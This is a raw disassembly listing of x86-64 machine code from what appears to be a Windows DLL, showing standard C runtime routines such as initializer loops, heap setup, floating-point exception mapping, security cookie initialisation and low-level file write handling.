   180003a66:	48 8d 1d 4b 72 00 00 	lea    0x724b(%rip),%rbx        # 0x18000acb8
   180003a6d:	48 8d 3d 44 72 00 00 	lea    0x7244(%rip),%rdi        # 0x18000acb8
   180003a74:	eb 0e                	jmp    0x180003a84
   180003a76:	48 8b 03             	mov    (%rbx),%rax
   180003a79:	48 85 c0             	test   %rax,%rax
   180003a7c:	74 02                	je     0x180003a80
   180003a7e:	ff d0                	call   *%rax
   180003a80:	48 83 c3 08          	add    $0x8,%rbx
   180003a84:	48 3b df             	cmp    %rdi,%rbx
   180003a87:	72 ed                	jb     0x180003a76
   180003a89:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003a8e:	48 83 c4 20          	add    $0x20,%rsp
   180003a92:	5f                   	pop    %rdi
   180003a93:	c3                   	ret
   180003a94:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003a99:	57                   	push   %rdi
   180003a9a:	48 83 ec 20          	sub    $0x20,%rsp
   180003a9e:	48 8d 1d 23 72 00 00 	lea    0x7223(%rip),%rbx        # 0x18000acc8
   180003aa5:	48 8d 3d 1c 72 00 00 	lea    0x721c(%rip),%rdi        # 0x18000acc8
   180003aac:	eb 0e                	jmp    0x180003abc
   180003aae:	48 8b 03             	mov    (%rbx),%rax
   180003ab1:	48 85 c0             	test   %rax,%rax
   180003ab4:	74 02                	je     0x180003ab8
   180003ab6:	ff d0                	call   *%rax
   180003ab8:	48 83 c3 08          	add    $0x8,%rbx
   180003abc:	48 3b df             	cmp    %rdi,%rbx
   180003abf:	72 ed                	jb     0x180003aae
   180003ac1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003ac6:	48 83 c4 20          	add    $0x20,%rsp
   180003aca:	5f                   	pop    %rdi
   180003acb:	c3                   	ret
   180003acc:	48 83 ec 28          	sub    $0x28,%rsp
   180003ad0:	45 33 c0             	xor    %r8d,%r8d
   180003ad3:	ba 00 10 00 00       	mov    $0x1000,%edx
   180003ad8:	33 c9                	xor    %ecx,%ecx
   180003ada:	c7 44 24 30 02 00 00 	movl   $0x2,0x30(%rsp)
   180003ae1:	00 
   180003ae2:	ff 15 78 56 00 00    	call   *0x5678(%rip)        # 0x180009160
   180003ae8:	48 89 05 59 9a 00 00 	mov    %rax,0x9a59(%rip)        # 0x18000d548
   180003aef:	48 85 c0             	test   %rax,%rax
   180003af2:	74 29                	je     0x180003b1d
   180003af4:	ff 15 5e 56 00 00    	call   *0x565e(%rip)        # 0x180009158
   180003afa:	3c 06                	cmp    $0x6,%al
   180003afc:	73 1a                	jae    0x180003b18
   180003afe:	48 8b 0d 43 9a 00 00 	mov    0x9a43(%rip),%rcx        # 0x18000d548
   180003b05:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180003b0a:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   180003b10:	33 d2                	xor    %edx,%edx
   180003b12:	ff 15 38 56 00 00    	call   *0x5638(%rip)        # 0x180009150
   180003b18:	b8 01 00 00 00       	mov    $0x1,%eax
   180003b1d:	48 83 c4 28          	add    $0x28,%rsp
   180003b21:	c3                   	ret
   180003b22:	cc                   	int3
   180003b23:	cc                   	int3
   180003b24:	48 83 ec 28          	sub    $0x28,%rsp
   180003b28:	48 8b 0d 19 9a 00 00 	mov    0x9a19(%rip),%rcx        # 0x18000d548
   180003b2f:	ff 15 33 56 00 00    	call   *0x5633(%rip)        # 0x180009168
   180003b35:	48 83 25 0b 9a 00 00 	andq   $0x0,0x9a0b(%rip)        # 0x18000d548
   180003b3c:	00 
   180003b3d:	48 83 c4 28          	add    $0x28,%rsp
   180003b41:	c3                   	ret
   180003b42:	cc                   	int3
   180003b43:	cc                   	int3
   180003b44:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003b49:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003b4e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003b53:	57                   	push   %rdi
   180003b54:	48 83 ec 20          	sub    $0x20,%rsp
   180003b58:	48 8b f2             	mov    %rdx,%rsi
   180003b5b:	8b f9                	mov    %ecx,%edi
   180003b5d:	e8 b6 ee ff ff       	call   0x180002a18
   180003b62:	45 33 c9             	xor    %r9d,%r9d
   180003b65:	48 8b d8             	mov    %rax,%rbx
   180003b68:	48 85 c0             	test   %rax,%rax
   180003b6b:	0f 84 8c 01 00 00    	je     0x180003cfd
   180003b71:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   180003b78:	48 8b ca             	mov    %rdx,%rcx
   180003b7b:	39 39                	cmp    %edi,(%rcx)
   180003b7d:	74 10                	je     0x180003b8f
   180003b7f:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   180003b86:	48 83 c1 10          	add    $0x10,%rcx
   180003b8a:	48 3b c8             	cmp    %rax,%rcx
   180003b8d:	72 ec                	jb     0x180003b7b
   180003b8f:	48 8d 82 c0 00 00 00 	lea    0xc0(%rdx),%rax
   180003b96:	48 3b c8             	cmp    %rax,%rcx
   180003b99:	73 04                	jae    0x180003b9f
   180003b9b:	39 39                	cmp    %edi,(%rcx)
   180003b9d:	74 03                	je     0x180003ba2
   180003b9f:	49 8b c9             	mov    %r9,%rcx
   180003ba2:	48 85 c9             	test   %rcx,%rcx
   180003ba5:	0f 84 52 01 00 00    	je     0x180003cfd
   180003bab:	4c 8b 41 08          	mov    0x8(%rcx),%r8
   180003baf:	4d 85 c0             	test   %r8,%r8
   180003bb2:	0f 84 45 01 00 00    	je     0x180003cfd
   180003bb8:	49 83 f8 05          	cmp    $0x5,%r8
   180003bbc:	75 0d                	jne    0x180003bcb
   180003bbe:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   180003bc2:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   180003bc6:	e9 34 01 00 00       	jmp    0x180003cff
   180003bcb:	49 83 f8 01          	cmp    $0x1,%r8
   180003bcf:	75 08                	jne    0x180003bd9
   180003bd1:	83 c8 ff             	or     $0xffffffff,%eax
   180003bd4:	e9 26 01 00 00       	jmp    0x180003cff
   180003bd9:	48 8b ab a8 00 00 00 	mov    0xa8(%rbx),%rbp
   180003be0:	48 89 b3 a8 00 00 00 	mov    %rsi,0xa8(%rbx)
   180003be7:	83 79 04 08          	cmpl   $0x8,0x4(%rcx)
   180003beb:	0f 85 f6 00 00 00    	jne    0x180003ce7
   180003bf1:	ba 30 00 00 00       	mov    $0x30,%edx
   180003bf6:	48 8b 83 a0 00 00 00 	mov    0xa0(%rbx),%rax
   180003bfd:	48 83 c2 10          	add    $0x10,%rdx
   180003c01:	4c 89 4c 02 f8       	mov    %r9,-0x8(%rdx,%rax,1)
   180003c06:	48 81 fa c0 00 00 00 	cmp    $0xc0,%rdx
   180003c0d:	7c e7                	jl     0x180003bf6
   180003c0f:	81 39 8e 00 00 c0    	cmpl   $0xc000008e,(%rcx)
   180003c15:	8b bb b0 00 00 00    	mov    0xb0(%rbx),%edi
   180003c1b:	75 0f                	jne    0x180003c2c
   180003c1d:	c7 83 b0 00 00 00 83 	movl   $0x83,0xb0(%rbx)
   180003c24:	00 00 00 
   180003c27:	e9 a5 00 00 00       	jmp    0x180003cd1
   180003c2c:	81 39 90 00 00 c0    	cmpl   $0xc0000090,(%rcx)
   180003c32:	75 0f                	jne    0x180003c43
   180003c34:	c7 83 b0 00 00 00 81 	movl   $0x81,0xb0(%rbx)
   180003c3b:	00 00 00 
   180003c3e:	e9 8e 00 00 00       	jmp    0x180003cd1
   180003c43:	81 39 91 00 00 c0    	cmpl   $0xc0000091,(%rcx)
   180003c49:	75 0c                	jne    0x180003c57
   180003c4b:	c7 83 b0 00 00 00 84 	movl   $0x84,0xb0(%rbx)
   180003c52:	00 00 00 
   180003c55:	eb 7a                	jmp    0x180003cd1
   180003c57:	81 39 93 00 00 c0    	cmpl   $0xc0000093,(%rcx)
   180003c5d:	75 0c                	jne    0x180003c6b
   180003c5f:	c7 83 b0 00 00 00 85 	movl   $0x85,0xb0(%rbx)
   180003c66:	00 00 00 
   180003c69:	eb 66                	jmp    0x180003cd1
   180003c6b:	81 39 8d 00 00 c0    	cmpl   $0xc000008d,(%rcx)
   180003c71:	75 0c                	jne    0x180003c7f
   180003c73:	c7 83 b0 00 00 00 82 	movl   $0x82,0xb0(%rbx)
   180003c7a:	00 00 00 
   180003c7d:	eb 52                	jmp    0x180003cd1
   180003c7f:	81 39 8f 00 00 c0    	cmpl   $0xc000008f,(%rcx)
   180003c85:	75 0c                	jne    0x180003c93
   180003c87:	c7 83 b0 00 00 00 86 	movl   $0x86,0xb0(%rbx)
   180003c8e:	00 00 00 
   180003c91:	eb 3e                	jmp    0x180003cd1
   180003c93:	81 39 92 00 00 c0    	cmpl   $0xc0000092,(%rcx)
   180003c99:	75 0c                	jne    0x180003ca7
   180003c9b:	c7 83 b0 00 00 00 8a 	movl   $0x8a,0xb0(%rbx)
   180003ca2:	00 00 00 
   180003ca5:	eb 2a                	jmp    0x180003cd1
   180003ca7:	81 39 b5 02 00 c0    	cmpl   $0xc00002b5,(%rcx)
   180003cad:	75 0c                	jne    0x180003cbb
   180003caf:	c7 83 b0 00 00 00 8d 	movl   $0x8d,0xb0(%rbx)
   180003cb6:	00 00 00 
   180003cb9:	eb 16                	jmp    0x180003cd1
   180003cbb:	81 39 b4 02 00 c0    	cmpl   $0xc00002b4,(%rcx)
   180003cc1:	8b c7                	mov    %edi,%eax
   180003cc3:	ba 8e 00 00 00       	mov    $0x8e,%edx
   180003cc8:	0f 44 c2             	cmove  %edx,%eax
   180003ccb:	89 83 b0 00 00 00    	mov    %eax,0xb0(%rbx)
   180003cd1:	8b 93 b0 00 00 00    	mov    0xb0(%rbx),%edx
   180003cd7:	b9 08 00 00 00       	mov    $0x8,%ecx
   180003cdc:	41 ff d0             	call   *%r8
   180003cdf:	89 bb b0 00 00 00    	mov    %edi,0xb0(%rbx)
   180003ce5:	eb 0a                	jmp    0x180003cf1
   180003ce7:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   180003ceb:	8b 49 04             	mov    0x4(%rcx),%ecx
   180003cee:	41 ff d0             	call   *%r8
   180003cf1:	48 89 ab a8 00 00 00 	mov    %rbp,0xa8(%rbx)
   180003cf8:	e9 d4 fe ff ff       	jmp    0x180003bd1
   180003cfd:	33 c0                	xor    %eax,%eax
   180003cff:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003d04:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180003d09:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003d0e:	48 83 c4 20          	add    $0x20,%rsp
   180003d12:	5f                   	pop    %rdi
   180003d13:	c3                   	ret
   180003d14:	b8 63 73 6d e0       	mov    $0xe06d7363,%eax
   180003d19:	3b c8                	cmp    %eax,%ecx
   180003d1b:	75 07                	jne    0x180003d24
   180003d1d:	8b c8                	mov    %eax,%ecx
   180003d1f:	e9 20 fe ff ff       	jmp    0x180003b44
   180003d24:	33 c0                	xor    %eax,%eax
   180003d26:	c3                   	ret
   180003d27:	cc                   	int3
   180003d28:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180003d2d:	57                   	push   %rdi
   180003d2e:	48 83 ec 20          	sub    $0x20,%rsp
   180003d32:	48 8b 05 37 92 00 00 	mov    0x9237(%rip),%rax        # 0x18000cf70
   180003d39:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   180003d3f:	48 bf 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rdi
   180003d46:	2b 00 00 
   180003d49:	48 3b c7             	cmp    %rdi,%rax
   180003d4c:	74 0c                	je     0x180003d5a
   180003d4e:	48 f7 d0             	not    %rax
   180003d51:	48 89 05 20 92 00 00 	mov    %rax,0x9220(%rip)        # 0x18000cf78
   180003d58:	eb 76                	jmp    0x180003dd0
   180003d5a:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003d5f:	ff 15 23 54 00 00    	call   *0x5423(%rip)        # 0x180009188
   180003d65:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003d6a:	ff 15 10 54 00 00    	call   *0x5410(%rip)        # 0x180009180
   180003d70:	44 8b d8             	mov    %eax,%r11d
   180003d73:	49 33 db             	xor    %r11,%rbx
   180003d76:	ff 15 c4 52 00 00    	call   *0x52c4(%rip)        # 0x180009040
   180003d7c:	44 8b d8             	mov    %eax,%r11d
   180003d7f:	49 33 db             	xor    %r11,%rbx
   180003d82:	ff 15 f0 53 00 00    	call   *0x53f0(%rip)        # 0x180009178
   180003d88:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   180003d8d:	44 8b d8             	mov    %eax,%r11d
   180003d90:	49 33 db             	xor    %r11,%rbx
   180003d93:	ff 15 d7 53 00 00    	call   *0x53d7(%rip)        # 0x180009170
   180003d99:	4c 8b 5c 24 38       	mov    0x38(%rsp),%r11
   180003d9e:	4c 33 db             	xor    %rbx,%r11
   180003da1:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
   180003da8:	ff 00 00 
   180003dab:	4c 23 d8             	and    %rax,%r11
   180003dae:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   180003db5:	2b 00 00 
   180003db8:	4c 3b df             	cmp    %rdi,%r11
   180003dbb:	4c 0f 44 d8          	cmove  %rax,%r11
   180003dbf:	4c 89 1d aa 91 00 00 	mov    %r11,0x91aa(%rip)        # 0x18000cf70
   180003dc6:	49 f7 d3             	not    %r11
   180003dc9:	4c 89 1d a8 91 00 00 	mov    %r11,0x91a8(%rip)        # 0x18000cf78
   180003dd0:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003dd5:	48 83 c4 20          	add    $0x20,%rsp
   180003dd9:	5f                   	pop    %rdi
   180003dda:	c3                   	ret
   180003ddb:	cc                   	int3
   180003ddc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003de1:	57                   	push   %rdi
   180003de2:	48 83 ec 20          	sub    $0x20,%rsp
   180003de6:	48 63 d9             	movslq %ecx,%rbx
   180003de9:	41 8b f8             	mov    %r8d,%edi
   180003dec:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   180003df1:	8b cb                	mov    %ebx,%ecx
   180003df3:	e8 20 2b 00 00       	call   0x180006918
   180003df8:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180003dfc:	75 11                	jne    0x180003e0f
   180003dfe:	e8 9d e8 ff ff       	call   0x1800026a0
   180003e03:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180003e09:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180003e0d:	eb 57                	jmp    0x180003e66
   180003e0f:	8b 54 24 38          	mov    0x38(%rsp),%edx
   180003e13:	4c 8d 44 24 3c       	lea    0x3c(%rsp),%r8
   180003e18:	44 8b cf             	mov    %edi,%r9d
   180003e1b:	48 8b c8             	mov    %rax,%rcx
   180003e1e:	ff 15 6c 53 00 00    	call   *0x536c(%rip)        # 0x180009190
   180003e24:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180003e28:	83 f8 ff             	cmp    $0xffffffff,%eax
   180003e2b:	75 13                	jne    0x180003e40
   180003e2d:	ff 15 95 52 00 00    	call   *0x5295(%rip)        # 0x1800090c8
   180003e33:	85 c0                	test   %eax,%eax
   180003e35:	74 09                	je     0x180003e40
   180003e37:	8b c8                	mov    %eax,%ecx
   180003e39:	e8 a2 e8 ff ff       	call   0x1800026e0
   180003e3e:	eb c9                	jmp    0x180003e09
   180003e40:	48 8b cb             	mov    %rbx,%rcx
   180003e43:	48 8b c3             	mov    %rbx,%rax
   180003e46:	48 8d 15 d3 b5 00 00 	lea    0xb5d3(%rip),%rdx        # 0x18000f420
   180003e4d:	48 c1 f8 05          	sar    $0x5,%rax
   180003e51:	83 e1 1f             	and    $0x1f,%ecx
   180003e54:	48 8b 04 c2          	mov    (%rdx,%rax,8),%rax
   180003e58:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   180003e5c:	80 64 08 08 fd       	andb   $0xfd,0x8(%rax,%rcx,1)
   180003e61:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   180003e66:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003e6b:	48 83 c4 20          	add    $0x20,%rsp
   180003e6f:	5f                   	pop    %rdi
   180003e70:	c3                   	ret
   180003e71:	cc                   	int3
   180003e72:	cc                   	int3
   180003e73:	cc                   	int3
   180003e74:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180003e79:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   180003e7d:	56                   	push   %rsi
   180003e7e:	57                   	push   %rdi
   180003e7f:	41 54                	push   %r12
   180003e81:	41 55                	push   %r13
   180003e83:	41 56                	push   %r14
   180003e85:	48 83 ec 20          	sub    $0x20,%rsp
   180003e89:	41 8b f0             	mov    %r8d,%esi
   180003e8c:	4c 8b e2             	mov    %rdx,%r12
   180003e8f:	48 63 f9             	movslq %ecx,%rdi
   180003e92:	83 ff fe             	cmp    $0xfffffffe,%edi
   180003e95:	75 18                	jne    0x180003eaf
   180003e97:	e8 24 e8 ff ff       	call   0x1800026c0
   180003e9c:	83 20 00             	andl   $0x0,(%rax)
   180003e9f:	e8 fc e7 ff ff       	call   0x1800026a0
   180003ea4:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180003eaa:	e9 92 00 00 00       	jmp    0x180003f41
   180003eaf:	85 c9                	test   %ecx,%ecx
   180003eb1:	78 76                	js     0x180003f29
   180003eb3:	3b 3d 4b b5 00 00    	cmp    0xb54b(%rip),%edi        # 0x18000f404
   180003eb9:	73 6e                	jae    0x180003f29
   180003ebb:	48 8b df             	mov    %rdi,%rbx
   180003ebe:	4c 8b ef             	mov    %rdi,%r13
   180003ec1:	49 c1 fd 05          	sar    $0x5,%r13
   180003ec5:	4c 8d 35 54 b5 00 00 	lea    0xb554(%rip),%r14        # 0x18000f420
   180003ecc:	83 e3 1f             	and    $0x1f,%ebx
   180003ecf:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   180003ed3:	4b 8b 04 ee          	mov    (%r14,%r13,8),%rax
   180003ed7:	0f be 4c 18 08       	movsbl 0x8(%rax,%rbx,1),%ecx
   180003edc:	83 e1 01             	and    $0x1,%ecx
   180003edf:	74 48                	je     0x180003f29
   180003ee1:	8b cf                	mov    %edi,%ecx
   180003ee3:	e8 a4 2a 00 00       	call   0x18000698c
   180003ee8:	90                   	nop
   180003ee9:	4b 8b 04 ee          	mov    (%r14,%r13,8),%rax
   180003eed:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   180003ef2:	74 12                	je     0x180003f06
   180003ef4:	44 8b c6             	mov    %esi,%r8d
   180003ef7:	49 8b d4             	mov    %r12,%rdx
   180003efa:	8b cf                	mov    %edi,%ecx
   180003efc:	e8 db fe ff ff       	call   0x180003ddc
   180003f01:	48 8b d8             	mov    %rax,%rbx
   180003f04:	eb 17                	jmp    0x180003f1d
   180003f06:	e8 95 e7 ff ff       	call   0x1800026a0
   180003f0b:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180003f11:	e8 aa e7 ff ff       	call   0x1800026c0
   180003f16:	83 20 00             	andl   $0x0,(%rax)
   180003f19:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   180003f1d:	8b cf                	mov    %edi,%ecx
   180003f1f:	e8 10 2b 00 00       	call   0x180006a34
   180003f24:	48 8b c3             	mov    %rbx,%rax
   180003f27:	eb 1c                	jmp    0x180003f45
   180003f29:	e8 92 e7 ff ff       	call   0x1800026c0
   180003f2e:	83 20 00             	andl   $0x0,(%rax)
   180003f31:	e8 6a e7 ff ff       	call   0x1800026a0
   180003f36:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   180003f3c:	e8 f7 e6 ff ff       	call   0x180002638
   180003f41:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   180003f45:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180003f4a:	48 83 c4 20          	add    $0x20,%rsp
   180003f4e:	41 5e                	pop    %r14
   180003f50:	41 5d                	pop    %r13
   180003f52:	41 5c                	pop    %r12
   180003f54:	5f                   	pop    %rdi
   180003f55:	5e                   	pop    %rsi
   180003f56:	c3                   	ret
   180003f57:	cc                   	int3
   180003f58:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180003f5d:	55                   	push   %rbp
   180003f5e:	56                   	push   %rsi
   180003f5f:	57                   	push   %rdi
   180003f60:	41 54                	push   %r12
   180003f62:	41 55                	push   %r13
   180003f64:	41 56                	push   %r14
   180003f66:	41 57                	push   %r15
   180003f68:	48 8d ac 24 d0 e5 ff 	lea    -0x1a30(%rsp),%rbp
   180003f6f:	ff 
   180003f70:	b8 30 1b 00 00       	mov    $0x1b30,%eax
   180003f75:	e8 d6 2c 00 00       	call   0x180006c50
   180003f7a:	48 2b e0             	sub    %rax,%rsp
   180003f7d:	48 8b 05 ec 8f 00 00 	mov    0x8fec(%rip),%rax        # 0x18000cf70
   180003f84:	48 33 c4             	xor    %rsp,%rax
   180003f87:	48 89 85 20 1a 00 00 	mov    %rax,0x1a20(%rbp)
   180003f8e:	33 ff                	xor    %edi,%edi
   180003f90:	45 8b f0             	mov    %r8d,%r14d
   180003f93:	4c 8b ea             	mov    %rdx,%r13
   180003f96:	21 7c 24 44          	and    %edi,0x44(%rsp)
   180003f9a:	48 63 d9             	movslq %ecx,%rbx
   180003f9d:	45 85 c0             	test   %r8d,%r8d
   180003fa0:	75 07                	jne    0x180003fa9
   180003fa2:	33 c0                	xor    %eax,%eax
   180003fa4:	e9 e5 06 00 00       	jmp    0x18000468e
   180003fa9:	48 85 d2             	test   %rdx,%rdx
   180003fac:	75 1f                	jne    0x180003fcd
   180003fae:	e8 0d e7 ff ff       	call   0x1800026c0
   180003fb3:	21 38                	and    %edi,(%rax)
   180003fb5:	e8 e6 e6 ff ff       	call   0x1800026a0
   180003fba:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180003fc0:	e8 73 e6 ff ff       	call   0x180002638
   180003fc5:	83 c8 ff             	or     $0xffffffff,%eax
   180003fc8:	e9 c1 06 00 00       	jmp    0x18000468e
   180003fcd:	4c 8b fb             	mov    %rbx,%r15
   180003fd0:	4c 8b e3             	mov    %rbx,%r12
   180003fd3:	48 8d 05 46 b4 00 00 	lea    0xb446(%rip),%rax        # 0x18000f420
   180003fda:	49 c1 fc 05          	sar    $0x5,%r12
   180003fde:	41 83 e7 1f          	and    $0x1f,%r15d
   180003fe2:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   180003fe6:	4c 89 64 24 50       	mov    %r12,0x50(%rsp)
   180003feb:	4d 6b ff 58          	imul   $0x58,%r15,%r15
   180003fef:	41 8a 74 0f 38       	mov    0x38(%r15,%rcx,1),%sil
   180003ff4:	4c 89 7c 24 60       	mov    %r15,0x60(%rsp)
   180003ff9:	40 02 f6             	add    %sil,%sil
   180003ffc:	40 d0 fe             	sar    $1,%sil
   180003fff:	40 80 fe 02          	cmp    $0x2,%sil
   180004003:	74 06                	je     0x18000400b
   180004005:	40 80 fe 01          	cmp    $0x1,%sil
   180004009:	75 09                	jne    0x180004014
   18000400b:	41 8b c6             	mov    %r14d,%eax
   18000400e:	f7 d0                	not    %eax
   180004010:	a8 01                	test   $0x1,%al
   180004012:	74 9a                	je     0x180003fae
   180004014:	41 f6 44 0f 08 20    	testb  $0x20,0x8(%r15,%rcx,1)
   18000401a:	74 0d                	je     0x180004029
   18000401c:	33 d2                	xor    %edx,%edx
   18000401e:	8b cb                	mov    %ebx,%ecx
   180004020:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   180004024:	e8 b3 fd ff ff       	call   0x180003ddc
   180004029:	8b cb                	mov    %ebx,%ecx
   18000402b:	e8 bc 07 00 00       	call   0x1800047ec
   180004030:	85 c0                	test   %eax,%eax
   180004032:	0f 84 ca 02 00 00    	je     0x180004302
   180004038:	48 8d 05 e1 b3 00 00 	lea    0xb3e1(%rip),%rax        # 0x18000f420
   18000403f:	4a 8b 04 e0          	mov    (%rax,%r12,8),%rax
   180004043:	41 f6 44 07 08 80    	testb  $0x80,0x8(%r15,%rax,1)
   180004049:	0f 84 b3 02 00 00    	je     0x180004302
   18000404f:	e8 48 ea ff ff       	call   0x180002a9c
   180004054:	33 db                	xor    %ebx,%ebx
   180004056:	48 8d 54 24 5c       	lea    0x5c(%rsp),%rdx
   18000405b:	48 8b 88 c0 00 00 00 	mov    0xc0(%rax),%rcx
   180004062:	48 8d 05 b7 b3 00 00 	lea    0xb3b7(%rip),%rax        # 0x18000f420
   180004069:	39 59 14             	cmp    %ebx,0x14(%rcx)
   18000406c:	4a 8b 0c e0          	mov    (%rax,%r12,8),%rcx
   180004070:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
   180004074:	0f 94 c3             	sete   %bl
   180004077:	ff 15 23 51 00 00    	call   *0x5123(%rip)        # 0x1800091a0
   18000407d:	85 c0                	test   %eax,%eax
   18000407f:	0f 84 7d 02 00 00    	je     0x180004302
   180004085:	85 db                	test   %ebx,%ebx
   180004087:	74 09                	je     0x180004092
   180004089:	40 84 f6             	test   %sil,%sil
   18000408c:	0f 84 70 02 00 00    	je     0x180004302
   180004092:	ff 15 00 51 00 00    	call   *0x5100(%rip)        # 0x180009198
   180004098:	21 7c 24 58          	and    %edi,0x58(%rsp)
   18000409c:	49 8b dd             	mov    %r13,%rbx
   18000409f:	89 44 24 5c          	mov    %eax,0x5c(%rsp)
   1800040a3:	45 85 f6             	test   %r14d,%r14d
   1800040a6:	0f 84 4d 02 00 00    	je     0x1800042f9
   1800040ac:	40 84 f6             	test   %sil,%sil
   1800040af:	0f 85 84 01 00 00    	jne    0x180004239
   1800040b5:	8a 0b                	mov    (%rbx),%cl
   1800040b7:	33 c0                	xor    %eax,%eax
   1800040b9:	80 f9 0a             	cmp    $0xa,%cl
   1800040bc:	0f 94 c0             	sete   %al
   1800040bf:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   1800040c3:	48 8d 05 56 b3 00 00 	lea    0xb356(%rip),%rax        # 0x18000f420
   1800040ca:	4a 8b 14 e0          	mov    (%rax,%r12,8),%rdx
   1800040ce:	41 83 7c 17 50 00    	cmpl   $0x0,0x50(%r15,%rdx,1)
   1800040d4:	74 20                	je     0x1800040f6
   1800040d6:	41 8a 44 17 4c       	mov    0x4c(%r15,%rdx,1),%al
   1800040db:	88 4c 24 61          	mov    %cl,0x61(%rsp)
   1800040df:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800040e5:	88 44 24 60          	mov    %al,0x60(%rsp)
   1800040e9:	41 83 64 17 50 00    	andl   $0x0,0x50(%r15,%rdx,1)
   1800040ef:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800040f4:	eb 49                	jmp    0x18000413f
   1800040f6:	0f be c9             	movsbl %cl,%ecx
   1800040f9:	e8 1a 16 00 00       	call   0x180005718
   1800040fe:	85 c0                	test   %eax,%eax
   180004100:	74 34                	je     0x180004136
   180004102:	49 8b c6             	mov    %r14,%rax
   180004105:	48 2b c3             	sub    %rbx,%rax
   180004108:	49 03 c5             	add    %r13,%rax
   18000410b:	48 83 f8 01          	cmp    $0x1,%rax
   18000410f:	0f 8e ad 01 00 00    	jle    0x1800042c2
   180004115:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   18000411a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180004120:	48 8b d3             	mov    %rbx,%rdx
   180004123:	e8 08 2b 00 00       	call   0x180006c30
   180004128:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000412b:	0f 84 b2 01 00 00    	je     0x1800042e3
   180004131:	48 ff c3             	inc    %rbx
   180004134:	eb 1c                	jmp    0x180004152
   180004136:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   18000413c:	48 8b d3             	mov    %rbx,%rdx
   18000413f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180004144:	e8 e7 2a 00 00       	call   0x180006c30
   180004149:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000414c:	0f 84 91 01 00 00    	je     0x1800042e3
   180004152:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   180004158:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000415e:	8b 4c 24 5c          	mov    0x5c(%rsp),%ecx
   180004162:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180004167:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   18000416c:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180004172:	33 d2                	xor    %edx,%edx
   180004174:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   18000417b:	00 
   18000417c:	48 ff c3             	inc    %rbx
   18000417f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180004184:	ff 15 b6 4f 00 00    	call   *0x4fb6(%rip)        # 0x180009140
   18000418a:	44 8b e0             	mov    %eax,%r12d
   18000418d:	85 c0                	test   %eax,%eax
   18000418f:	0f 84 4e 01 00 00    	je     0x1800042e3
   180004195:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   18000419a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1800041a0:	48 8d 05 79 b2 00 00 	lea    0xb279(%rip),%rax        # 0x18000f420
   1800041a7:	48 8b 0c c8          	mov    (%rax,%rcx,8),%rcx
   1800041ab:	4c 8d 4c 24 58       	lea    0x58(%rsp),%r9
   1800041b0:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1800041b5:	49 8b 0c 0f          	mov    (%r15,%rcx,1),%rcx
